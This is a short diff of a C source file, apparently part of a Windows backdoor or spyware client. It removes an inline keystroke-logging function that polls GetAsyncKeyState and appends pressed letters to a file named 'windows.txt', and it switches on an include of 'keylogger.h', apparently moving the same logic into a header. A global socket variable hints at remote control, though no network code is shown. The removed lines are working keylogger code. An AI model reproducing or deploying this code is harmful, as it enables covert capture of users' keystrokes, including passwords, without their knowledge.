@@ -10,30 +10,9 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <stdbool.h>
-//#include "keylogger.h"
+#include "keylogger.h"
 
 int sock;
-
-DWORD WINAPI logg()
-{
-	int result, keys;
-    FILE *fp;
-
-    fp = fopen("windows.txt", "a");
-
-    while (true) {
-        for (keys = 64; keys <= 90; keys++) {
-            sleep(1);
-
-            result = GetAsyncKeyState(keys);
-
-            if (result == -32767) {
-                fprintf(fp, "%c", keys);
-            }
-        }
-    }
-}
-
 
 char *strslice(const char *str, size_t start, size_t end)
 {
